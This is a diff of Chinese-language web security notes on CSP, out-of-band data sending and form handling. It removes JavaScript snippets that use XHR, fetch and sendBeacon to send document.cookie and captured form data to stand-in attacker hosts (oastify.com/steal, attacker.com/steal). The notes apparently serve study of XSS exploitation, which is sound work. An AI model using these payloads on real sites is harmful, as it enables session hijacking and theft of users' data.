@@ -137,112 +137,17 @@ SVG 动画标签 `<animateTransform attributeName="transform">` 在其目标元�
 
 - `script-src 'self'` 仅允许同源 JS 脚本文件，禁止脚本标签与事件监听器
 
-## 收发数据
-
-### XHR
-
-```js
-var req = new XMLHttpRequest();
-req.onload = 回调函数; // 设置回调函数
-req.open('get', '/foo', true); // 设置方法、端点、异步
-req.send(); // 发送
-
-function 回调函数(){
-    // 方式1：从响应体中提取数据
-    let value_reg = this.responseText.match(/正则表达式/)[1];
-
-    // 方式2：解析为 DOM，之后使用 .getAttribute(属性)
-    let response_dom = new DOMParser().parseFromString(this.responseText, "text/html");
-    let value_dom = response_dom.querySelector(元素查询字符串);
-}
-```
-- `open(method, url, async, user, password)`
-
-### fetch
-
-```js
-fetch('/foo', {credentials: "include"})
-    .then(response => response.text())
-    .then(text => text.match(/正则表达式/)[1])
-    .catch(err => console.log('Request Failed', err)); 
-```
-
 ## 带外信息
 
 ### 发送数据
 
 页面的 HTTP(S) 状态与端点方法需一致
 
-- XMLHttpRequest
-    - GET
-        ```js
-        {
-            let xhr = new XMLHttpRequest();
+- `XMLHttpRequest()`
 
-            xhr.open("GET", "https://oastify.com/steal?cookie=" + document.cookie, true);
+- `fetch()` 
 
-            xhr.send();
-        }
-        ```
-
-    - POST
-        ```js
-        {
-            let xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://oastify.com/steal", true);
-
-            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-            xhr.send("cookie=" + document.cookie);
-        }
-        ```
-
-- fetch 
-    - GET
-        ```js
-        fetch("https://oastify.com/steal?cookie=" + document.cookie, 
-            {mode: 'no-cors'});
-        ```
-
-    - POST 
-        ```js
-        // URLSearchParams
-        fetch("https://oastify.com/steal", {
-            method: "POST",
-            // 禁用跨域请求模式：不“读取”监听服务器的响应，不发送 OPTIONS 预检请求，而直接发送当前请求
-            mode: 'no-cors', 
-            headers: {
-                "Content-Type": "application/x-www-form-urlencoded",
-            },
-            body: new URLSearchParams({
-                "cookie": document.cookie,
-            })
-        });
-        ```
-        - JSON
-            - 头部
-                `"Content-Type": "application/json"`
-            - 数据
-                `JSON.stringify({名:值})`
-
-- `navigator.sendBeacon()` POST
-    ```js
-    // 字典
-    navigator.sendBeacon("https://attacker.com/steal",
-        new URLSearchParams({
-            "cookie": document.cookie,
-            "url": window.location.href
-        })
-    );
-    ```
-    - 列表
-        ```js
-        new URLSearchParams([
-                ["cookie", document.cookie],
-                ["url", window.location.href]
-            ])   
-        ```
-        - 二维数组的项似乎被视为名值对
+- `navigator.sendBeacon()` 仅 POST
 
 [简单请求](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS)
 - 若非简单请求，则触发预检
@@ -292,42 +197,6 @@ document.addEventListener('DOMContentLoaded', function() {
 ```
 
 ## 表单
-
-```js
-// 选取表单元素
-let form_ele = document.querySelector('form');
-// 将表单元素转为表单数据对象
-let form_data_obj = new FormData(form_ele);
-
-// 若添加字段
-form_data_obj.append("foo", "bar");
-
-// 将表单数据对象转为搜索名值对字符串，可直接在 GET 中发送
-let form_params = new URLSearchParams(form_data_obj);
-fetch("https://oastify.com/steal?" + form_params, {mode: 'no-cors'});
-
-
-// 或将表单数据对象使用 POST 直接以 form-data 格式发送，自动设置表单类型头部
-fetch("https://oastify.com/steal", {
-    method: "POST",
-    mode: 'no-cors', 
-    credentials: 'include',
-    body: form_data_obj
-});
-
-// FormData.entries() 方法返回一个迭代器，该迭代器遍历 FormData 中包含的所有键/值对
-for (var pair of form_data_obj.entries()) {
-    var key = pair[0];
-    var value = pair[1];
-    ...
-}
-
-// 在表单设置事件监听器，修改默认行为到自定义函数，并阻止事件传递（阻止默认表单行为）
-document.getElementById("the_form_id").addEventListener("submit", function(e) {
-    自定义函数(this.getAttribute("method"), this.getAttribute("action"), new FormData(this));
-    e.preventDefault();
-});
-```
 
 input 元素 value 值变化事件
 - `onchange`
